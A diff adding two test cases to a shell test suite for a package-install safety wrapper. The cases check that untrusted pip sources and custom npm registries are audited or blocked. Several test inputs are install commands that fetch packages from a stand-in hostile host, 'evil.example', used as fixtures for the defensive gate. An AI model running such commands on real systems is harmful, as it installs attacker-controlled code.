@@ -1228,6 +1228,37 @@ EOF
   pass "$FUNCNAME"
 }
 
+case_pip_cumulative_sources_all_reach_audit() {
+  prepare_case "pip-cumulative-sources"
+  # pip considers BOTH --find-links and the index; a later trusted selector
+  # must not erase the earlier untrusted one (delta-2 finding 3).
+  SAFE_INSTALL_TEST_SCRIPT='pip install --find-links https://evil.example/wheels --index-url https://pypi.org/simple blockme==1.0.0' run_zsh
+  assert_status 104 "$FUNCNAME" || return
+  assert_log_contains $'AUDIT\tcheck\tblockme@1.0.0\t--ecosystem\tpython\t--gate\tinstall\t--op\tinstall\t--registry\tlocal:find-links https://pypi.org/simple' "$FUNCNAME" || return
+  pass "$FUNCNAME"
+}
+
+case_stale_evidence_is_source_scoped() {
+  prepare_case "stale-evidence-source-scoped"
+  mkdir -p "${HOME_DIR}/.config/safe/run"
+  printf '{"packages": {"npm:okpkg": {"version": "1.0.0", "verdict": "GO", "reasons": [], "evidence": "x", "source": "default", "first_allowed": "%s", "last_used": "2026-07-31", "times_used": 1}}}\n' \
+    "$(date -Iseconds)" > "${HOME_DIR}/.config/safe/run/install-known.json"
+
+  # Same source (default): the fresh GO receipt may carry an audit timeout.
+  SAFE_AUDIT_CHECK_STATUS=124 SAFE_INSTALL_TEST_SCRIPT='npm install -g okpkg@1.0.0' run_zsh
+  assert_status 0 "$FUNCNAME" || return
+  assert_log_contains $'REAL\tnpm\tinstall\t-g\tokpkg@1.0.0' "$FUNCNAME" || return
+  assert_err_contains_fragment 'stale evidence' "$FUNCNAME" || return
+
+  # Different source: default-registry evidence must NOT vouch for a custom
+  # index (delta-2 finding 5) — fail closed.
+  : > "${LOG_FILE}"
+  SAFE_AUDIT_CHECK_STATUS=124 SAFE_INSTALL_TEST_SCRIPT='npm install -g --registry https://evil.example okpkg@1.0.0' run_zsh
+  assert_status 100 "$FUNCNAME" || return
+  assert_log_not_contains_fragment $'REAL\tnpm' "$FUNCNAME" || return
+  pass "$FUNCNAME"
+}
+
 case_uninstall_cleans_shell_and_legacy_binaries() {
   prepare_case "uninstall-cleans-shell-and-legacy-binaries"
   mkdir -p "${HOME_DIR}/.local/bin" "${HOME_DIR}/.local/share/zsh/site-functions" "${HOME_DIR}/.config/safe-run/completions" "${HOME_DIR}/.config/safe" "${HOME_DIR}/.local/share/safe"
@@ -1339,6 +1370,8 @@ main() {
     case_cargo_parser \
     case_go_parser \
     case_composer_parser \
+    case_pip_cumulative_sources_all_reach_audit \
+    case_stale_evidence_is_source_scoped \
     case_install_idempotent_no_wrappers \
     case_install_idempotent_with_completions \
     case_install_cleans_legacy_safe_install_artifacts \
